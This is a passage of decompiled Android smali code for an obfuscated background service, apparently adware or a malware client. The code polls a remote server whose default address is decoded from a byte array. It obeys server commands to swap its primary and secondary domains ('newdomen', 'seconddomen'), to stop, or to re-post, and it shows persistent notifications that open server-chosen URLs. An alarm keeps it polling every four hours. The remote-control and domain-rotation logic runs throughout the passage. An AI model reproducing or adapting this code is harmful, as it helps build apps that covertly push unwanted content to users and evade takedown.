    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_0

    .line 263
    move-object/from16 v0, p0

    invoke-direct {v0, v7}, Lcom/bratolubzet/stlstart/Bragushterra;->parseNews(Lorg/json/JSONObject;)V

    .line 264
    invoke-direct/range {p0 .. p1}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V

    .line 266
    :cond_0
    const-string v19, "newdomen"

    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_1

    .line 267
    const-string v19, "url"

    move-object/from16 v0, v19

    invoke-virtual {v7, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 268
    .local v9, "newUrl":Ljava/lang/String;
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "set primary url "

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 269
    move-object/from16 v0, p0

    iput-object v9, v0, Lcom/bratolubzet/stlstart/Bragushterra;->primaryServerUrl:Ljava/lang/String;

    .line 270
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    move-object/from16 v19, v0

    invoke-interface/range {v19 .. v19}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v19

    const-string v20, "primaryServerUrl"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->primaryServerUrl:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-interface/range {v19 .. v21}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v19

    invoke-interface/range {v19 .. v19}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 271
    invoke-direct/range {p0 .. p1}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V

    .line 273
    .end local v9    # "newUrl":Ljava/lang/String;
    :cond_1
    const-string v19, "seconddomen"

    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_2

    .line 274
    const-string v19, "url"

    move-object/from16 v0, v19

    invoke-virtual {v7, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 275
    .restart local v9    # "newUrl":Ljava/lang/String;
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "set secondary url "

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 276
    move-object/from16 v0, p0

    iput-object v9, v0, Lcom/bratolubzet/stlstart/Bragushterra;->secondaryServerUrl:Ljava/lang/String;

    .line 277
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    move-object/from16 v19, v0

    invoke-interface/range {v19 .. v19}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v19

    const-string v20, "secondaryServerUrl"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->secondaryServerUrl:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-interface/range {v19 .. v21}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v19

    invoke-interface/range {v19 .. v19}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 278
    invoke-direct/range {p0 .. p1}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V

    .line 280
    .end local v9    # "newUrl":Ljava/lang/String;
    :cond_2
    const-string v19, "stop"

    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_3

    .line 281
    const-string v19, "stop service "

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 282
    invoke-direct/range {p0 .. p0}, Lcom/bratolubzet/stlstart/Bragushterra;->stopUpdating()V

    .line 283
    invoke-virtual/range {p0 .. p0}, Lcom/bratolubzet/stlstart/Bragushterra;->stopSelf()V

    .line 285
    :cond_3
    const-string v19, "testpost"

    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_4

    .line 286
    const-string v19, "testpost"

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 287
    invoke-direct/range {p0 .. p1}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V

    .line 289
    :cond_4
    const-string v19, "ok"

    move-object/from16 v0, v19

    invoke-virtual {v15, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-eqz v19, :cond_5

    .line 290
    const-string v19, "ok"

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 294
    .end local v3    # "builder":Ljava/lang/StringBuilder;
    .end local v7    # "jsonObject":Lorg/json/JSONObject;
    .end local v8    # "line":Ljava/lang/String;
    .end local v14    # "reader":Ljava/io/BufferedReader;
    .end local v15    # "status":Ljava/lang/String;
    .end local v16    # "tokener":Lorg/json/JSONTokener;
    :cond_5
    invoke-virtual {v6}, Ljava/io/InputStream;->close()V

    .line 295
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 296
    return-void

    .line 217
    .end local v4    # "connection":Ljava/net/HttpURLConnection;
    .end local v6    # "inputStream":Ljava/io/InputStream;
    .end local v17    # "urlParameters":Ljava/lang/String;
    .end local v18    # "wr":Ljava/io/DataOutputStream;
    :cond_6
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v4

    check-cast v4, Ljava/net/HttpURLConnection;

    .restart local v4    # "connection":Ljava/net/HttpURLConnection;
    goto/16 :goto_0

    .line 254
    .restart local v3    # "builder":Ljava/lang/StringBuilder;
    .restart local v6    # "inputStream":Ljava/io/InputStream;
    .restart local v8    # "line":Ljava/lang/String;
    .restart local v14    # "reader":Ljava/io/BufferedReader;
    .restart local v17    # "urlParameters":Ljava/lang/String;
    .restart local v18    # "wr":Ljava/io/DataOutputStream;
    :cond_7
    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto/16 :goto_1
.end method

.method private showNews(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/graphics/Bitmap;I)V
    .locals 15
    .param p1, "id"    # I
    .param p2, "text"    # Ljava/lang/String;
    .param p3, "title"    # Ljava/lang/String;
    .param p4, "url"    # Ljava/lang/String;
    .param p5, "icon"    # Landroid/graphics/Bitmap;
    .param p6, "showDelay"    # I

    .prologue
    .line 366
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "show news "

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move/from16 v0, p1

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, " "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    move-object/from16 v0, p2

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, " "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    move-object/from16 v0, p4

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, " "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    move/from16 v0, p6

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {p0, v11}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 368
    move-object/from16 v8, p3

    .line 369
    .local v8, "tickerText":Ljava/lang/CharSequence;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    .line 370
    .local v9, "when":J
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    .line 371
    .local v5, "context":Landroid/content/Context;
    const-string v3, "New news"

    .line 372
    .local v3, "contentTitle":Ljava/lang/CharSequence;
    move-object/from16 v2, p2

    .line 374
    .local v2, "contentText":Ljava/lang/CharSequence;
    new-instance v7, Landroid/content/Intent;

    const-string v11, "android.intent.action.VIEW"

    invoke-static/range {p4 .. p4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v12

    invoke-direct {v7, v11, v12}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 375
    .local v7, "notificationIntent":Landroid/content/Intent;
    const/4 v11, 0x0

    const/4 v12, 0x0

    invoke-static {p0, v11, v7, v12}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 377
    .local v1, "contentIntent":Landroid/app/PendingIntent;
    new-instance v6, Landroid/app/Notification;

    const v11, 0x7f020002

    invoke-direct {v6, v11, v8, v9, v10}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 378
    .local v6, "notification":Landroid/app/Notification;
    move/from16 v0, p6

    mul-int/lit16 v11, v0, 0x3e8

    int-to-long v11, v11

    add-long/2addr v11, v9

    iput-wide v11, v6, Landroid/app/Notification;->when:J

    .line 379
    iget v11, v6, Landroid/app/Notification;->flags:I

    or-int/lit8 v11, v11, 0x10

    iput v11, v6, Landroid/app/Notification;->flags:I

    .line 380
    iget v11, v6, Landroid/app/Notification;->flags:I

    or-int/lit8 v11, v11, 0x2

    iput v11, v6, Landroid/app/Notification;->flags:I

    .line 382
    invoke-virtual {v6, v5, v3, v2, v1}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 384
    new-instance v4, Landroid/widget/RemoteViews;

    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getPackageName()Ljava/lang/String;

    move-result-object v11

    const v12, 0x7f030001

    invoke-direct {v4, v11, v12}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    .line 385
    .local v4, "contentView":Landroid/widget/RemoteViews;
    const v11, 0x7f070011

    move-object/from16 v0, p5

    invoke-virtual {v4, v11, v0}, Landroid/widget/RemoteViews;->setImageViewBitmap(ILandroid/graphics/Bitmap;)V

    .line 386
    const v11, 0x7f070013

    move-object/from16 v0, p3

    invoke-virtual {v4, v11, v0}, Landroid/widget/RemoteViews;->setTextViewText(ILjava/lang/CharSequence;)V

    .line 387
    const v11, 0x7f070014

    move-object/from16 v0, p2

    invoke-virtual {v4, v11, v0}, Landroid/widget/RemoteViews;->setTextViewText(ILjava/lang/CharSequence;)V

    .line 388
    iput-object v4, v6, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;

    .line 390
    new-instance v11, Ljava/util/Timer;

    invoke-direct {v11}, Ljava/util/Timer;-><init>()V

    new-instance v12, Lcom/bratolubzet/stlstart/Bragushterra$2;

    move/from16 v0, p1

    invoke-direct {v12, p0, v0, v6}, Lcom/bratolubzet/stlstart/Bragushterra$2;-><init>(Lcom/bratolubzet/stlstart/Bragushterra;ILandroid/app/Notification;)V

    .line 400
    move/from16 v0, p6

    mul-int/lit16 v13, v0, 0x3e8

    int-to-long v13, v13

    .line 390
    invoke-virtual {v11, v12, v13, v14}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 401
    return-void
.end method

.method private startUpdateThread()V
    .locals 2

    .prologue
    .line 158
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/bratolubzet/stlstart/Bragushterra$1;

    invoke-direct {v1, p0}, Lcom/bratolubzet/stlstart/Bragushterra$1;-><init>(Lcom/bratolubzet/stlstart/Bragushterra;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 162
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 163
    return-void
.end method

.method private startUpdater()V
    .locals 8

    .prologue
    .line 138
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 139
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    new-instance v7, Landroid/content/Intent;

    const-class v1, Lcom/bratolubzet/stlstart/Bugogashenki;

    invoke-direct {v7, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 140
    .local v7, "sendIntent":Landroid/content/Intent;
    const/4 v1, 0x0

    const/high16 v2, 0x8000000

    invoke-static {p0, v1, v7, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 142
    .local v6, "pendingIntent":Landroid/app/PendingIntent;
    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 143
    const/4 v1, 0x3

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const-wide/32 v4, 0xdbba00

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 146
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->startUpdateThread()V

    .line 147
    return-void
.end method

.method private stopUpdating()V
    .locals 5

    .prologue
    .line 193
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/bratolubzet/stlstart/Bugogashenki;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 194
    .local v2, "sendIntent":Landroid/content/Intent;
    const/4 v3, 0x0

    const/high16 v4, 0x8000000

    invoke-static {p0, v3, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 195
    .local v1, "pendingIntent":Landroid/app/PendingIntent;
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "alarm"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 196
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-virtual {v0, v1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 197
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 79
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 85
    const-string v0, "Bragushterra Created"

    invoke-direct {p0, v0}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 87
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->fillPostData()V

    .line 89
    const-string v0, "Bragushterra"

    invoke-virtual {p0, v0, v4}, Lcom/bratolubzet/stlstart/Bragushterra;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    .line 90
    iget-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "primaryServerUrl"

    new-instance v2, Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->nambytes:[B

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->primaryServerUrl:Ljava/lang/String;

    .line 91
    iget-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "secondaryServerUrl"

    new-instance v2, Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->nambytes:[B

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->secondaryServerUrl:Ljava/lang/String;

    .line 92
    iget-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "queryNum"

    invoke-interface {v0, v1, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    iput v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    .line 94
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 189
    const-string v0, "Bragushterra Destroyed"

    invoke-direct {p0, v0}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 190
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 120
    const-string v0, "Bragushterra Started"

    invoke-direct {p0, v0}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 122
    if-eqz p1, :cond_2

    .line 123
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    if-eqz v0, :cond_1

    .line 124
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "update"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 125
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->startUpdateThread()V

    .line 133
    :cond_0
    :goto_0
    const/4 v0, 0x1

    return v0

    .line 128
    :cond_1
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->startUpdater()V

    goto :goto_0

    .line 130
    :cond_2
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->startUpdater()V

    goto :goto_0
.end method
